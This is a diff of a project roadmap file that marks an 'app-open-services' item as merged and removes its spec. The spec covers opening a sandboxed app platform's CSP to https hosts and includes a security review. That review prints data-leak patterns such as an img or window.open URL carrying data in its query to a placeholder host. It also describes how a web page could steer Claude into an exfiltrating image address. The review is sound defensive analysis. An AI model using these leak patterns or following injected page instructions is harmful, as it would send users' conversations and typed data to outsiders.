@@ -81,6 +81,9 @@ run after the real key goes into the server `.env`.
 **Owner's order, 2026-10-22:** after image-generation is deployed,
 **auto-depth (8)** is next, then **app-open-services (9)** (maps first) — ahead of the other
 items below (each still branch, test, report, WAIT).
+**app-open-services merged 2026-10-22** (`35390a4`) — row in
+[`archive/done.md`](archive/done.md), spec in
+[`archive/done-specs.md`](archive/done-specs.md#app-open-services--full-spec-merged-2026-10-22).
 
 **The numbered list below is the authority on order** — numbers written
 inside spec sections are snapshots and go stale at every reorder. The
@@ -252,91 +255,6 @@ each entry below says whether it is pre-approved.
        decision model such as TypeSafe's Jev once out of early access) is a
        later option behind the same seam, not part of this item.
 
-9. **app-open-services** · M3 · branch `feat-app-open-services`
-    *Owner's decision 2026-10-22, not pre-approved — branch, test, report,
-    WAIT; after auto-depth.* Started as "app-maps" (여행 일정 메이커's map
-    is pins on a blank background); the owner then asked for the general
-    case — **"it may not only be maps … each time do i have to add
-    something to the server. i just want the claude to do it"** — and,
-    after the review below, chose to open the network instead of an
-    allow-list: **"채팅이든 앱이든 하면 될 것 같은데"**, with the privacy
-    notice covering it (members are already told to be careful). This
-    replaces the earlier plan (an admin-managed allow-list of hosts, a
-    요청/승인 flow and a deny list of paste sites and webhooks).
-    1. **Apps: every https host.** The member files' CSP
-       (`app_files_csp` in `backend/app/services/app_shell.py` and the
-       same line in `deploy/Caddyfile`, kept equal by a test) allows
-       `https:` in `connect-src`, `img-src`, `media-src`, `script-src`,
-       `style-src` and `font-src` (plus today's `'self' data: blob:`) and
-       `worker-src 'self' blob:`; no `http:`, no `ws:`. Unchanged: the
-       sandbox (never `allow-same-origin`), `frame-ancestors`, the shell's
-       own CSP, and the Builder's srcdoc fallback preview (no network).
-    2. **Our own API stays shut to apps.** With `https:` open, an app can
-       send requests to `ctrlai.my/api/*`. The standing rules (host-only
-       session cookie, JSON bodies on every state-changing route, no CORS)
-       already answer this; add a test that a request from a sandboxed
-       app frame carries no session and cannot read or change anything.
-    3. **Chat shows outside images.** `ChatMarkdown` renders image
-       Markdown from any https host instead of `[그림: …]`, and the main
-       site's `img-src` allows `https:`. Known risk, accepted: with web
-       search on, a page Claude reads could steer it into an image address
-       that carries that conversation out (only what Claude sees in that
-       conversation — not passwords, sessions, email, other chats or
-       wallets). Covered by the notice (point 5), not by code.
-    4. **Claude uses services by itself.** The Builder's app rules say:
-       outside https services may be used; prefer free, keyless,
-       well-known ones — maps **Leaflet + OpenStreetMap tiles** ("©
-       OpenStreetMap", referrer on tile requests; MapLibre was tried and
-       never loads its tiles in an opaque-origin frame), weather Open-Meteo, rates Frankfurter, libraries
-       from cdnjs/jsDelivr with pinned versions, photos from Wikimedia
-       Commons (licence and author shown); **never put an API key in app
-       code** (anyone can read it); **never write image addresses from
-       memory** — find them while the app runs (e.g. Wikimedia's search
-       API), since remembered URLs are usually wrong.
-    5. **Privacy notice:** add to the existing 개인정보 처리방침
-       (`frontend/app/privacy/page.tsx` › 4. 누구에게 전달되나) that apps
-       and Chat may load outside services, which then receive the
-       visitor's IP address and whatever that app or answer sends. Same
-       PR: that section still says the beta answers with a mock and sends
-       nothing out — no longer true (production runs real Claude), fix it.
-    6. **Maps first:** 여행 일정 메이커 gets a real map as the first user,
-       keeping its hand-drawn SVG map when tiles do not arrive. If OSM's
-       tile servers ever refuse us, the options are another keyless raster
-       source or self-hosted tiles on our own Caddy.
-    7. **Thumbnails:** the server renderer (`thumbs` worker) keeps its
-       network isolation for now — an app whose look depends on outside
-       loads may photograph without them. Revisit only if it matters.
-    **What it replaces:** most of app-libraries (6) — apps load libraries
-    from a CDN — and web-search-and-images B (server-fetched images) for
-    both apps and Chat; see those entries.
-
-    **Review 2026-10-22 — what opening the network exposes** (kept as the
-    reasoning behind the decision):
-    - **Safe either way (by structure):** the session cookie (HttpOnly,
-      host-only; the sandbox has no `allow-same-origin`); account data
-      (`ctrlai.user()` gives only `displayName` and the per-app
-      `appUserId` — no email); money (AI still goes through
-      `usage.charge()`).
-    - **What could leave:** the visitor's IP address; what the visitor
-      typed into that app; anything the app can already read — public
-      `ctrlai.db` data (other members' posts with `displayName`), AI
-      answers, `displayName`/`appUserId`.
-    - **"Display-only" loads are not IP-only.** Any URL can carry data in
-      its path or query (`<img src="https://x/?d=…">`), so opening
-      `img-src`/`script-src`/`style-src`/`font-src` is, for leaks, about
-      the same as opening `connect-src` — the split "display loads open,
-      `connect-src` on an allow-list" protects less than it looks.
-    - **Today was not fully closed either.** The files' CSP has no
-      `form-action` and the sandbox allows forms and popups, so a form
-      post or `window.open("https://…?d=…")` could already send typed
-      content out, and a fake login form was already possible. Opening the
-      network adds little new risk.
-    - **Outside scripts and the wallet:** a third party's script inside an
-      app could call `ctrlai.ai.ask` on the visitor's wallet — bounded by
-      the per-app cap, 데모 and 기능 상자 멈추기.
-    - Blocking everything was a conservative default ("member code, so
-      block it all"), not an answer to a specific threat; for an
-      invite-only club with little personal data, opening is reasonable.
 ---
 
 ## After the beta (specced, not in Next)
